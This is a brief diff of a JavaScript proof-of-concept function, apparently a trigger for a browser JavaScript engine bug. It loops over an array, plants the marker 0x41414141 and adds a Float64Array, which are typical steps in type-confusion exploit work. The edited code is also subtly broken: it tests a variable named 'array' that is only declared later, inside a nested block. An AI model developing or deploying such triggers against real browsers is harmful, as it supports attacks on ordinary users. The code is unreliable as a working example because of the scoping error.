@@ -9,15 +9,20 @@ function trigger () {
    var arrayc = [{},13.37,1];
    for (var l = 0; l < 10000; l++) {
     NoCow(arrayc);
-    if(arrayc) {
+    if(array) {
        arrayc[1] = { a : 0x41414141 };
        arrayc = NoCow(arrayc[1]);
+       
     }
-    if(l == 10000) {
-     alert(arrayc[1])
-     alert(arrayc)
+    if(l == 9999) {
+     let array = new Float64Array(8);
+alert (arrayc)
     }
     
    }
+
+alert(arrayc[1])
+     alert(arrayc)
+
 } 
 </script>
